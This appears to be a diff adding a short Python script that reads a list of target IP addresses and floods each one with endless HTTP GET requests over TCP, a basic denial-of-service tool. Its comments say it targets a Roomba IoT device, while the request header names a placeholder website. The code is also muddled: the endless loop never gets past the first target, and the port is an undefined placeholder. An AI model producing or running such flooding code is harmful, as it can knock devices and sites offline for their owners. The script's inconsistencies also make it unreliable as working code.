@@ -1,0 +1,19 @@
+import socket
+
+# Define the path to the text file containing the target IP addresses
+ip_list_file = "path/to/ip_list.txt"
+target_port = TARGET_PORT
+
+# Read the target IP addresses from the text file
+with open(ip_list_file, "r") as file:
+    target_ips = file.read().splitlines()
+
+# Iterate through the list of target IP addresses
+for target_ip in target_ips:
+    # Create a socket and connect to the target IP and port
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect((target_ip, target_port))
+
+    # Send packets to the Roomba IoT device
+    while True:
+        sock.send(b"GET / HTTP/1.1\r\nHost: TARGET_WEBSITE\r\n\r\n")
